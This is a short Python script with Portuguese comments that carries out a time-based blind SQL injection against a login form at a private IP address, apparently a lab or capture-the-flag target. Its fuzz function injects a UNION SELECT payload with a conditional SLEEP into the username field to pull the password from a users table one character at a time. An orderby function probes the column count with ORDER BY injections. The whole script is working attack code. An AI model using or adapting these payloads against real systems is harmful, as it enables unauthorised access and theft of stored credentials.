import requests #para requisições web
import time #para usar o sleep
import string #para pegar caracteres printaveis 0-9,a-z,A-Z,!?;.@#$%&*()[]

def req(query):
	url = 'http://10.10.0.34/'
	data = {'username': query,'password':'asdfasd'}
	r = requests.post(url, data=data)
	return r.text

def fuzz():
	printables = string.printable
	nome_db = ''
	while True:
		for char in printables:
			guess_db = nome_db + char
			query = "' union select 1,2,if(substring((select password from users limit 1,1),1,"+str(len(guess_db))+")='"+guess_db+"',sleep(3),NULL) -- -"
			print(guess_db)
			antes = time.time()
			req(query)
			depois = time.time()
			total = depois - antes
			if(int(total) >= 3):
				nome_db = guess_db
				break

def orderby():
	numeros = ({1,2,3,4,5,6,7,8,9})
	for num in numeros:
		query = "' or 1=1 order by "+ str(num) +' -- -'
		print(num)
		if not 'Username or password is invalid!' in req(query):
			print("Union correct: "+ str(num))

fuzz()
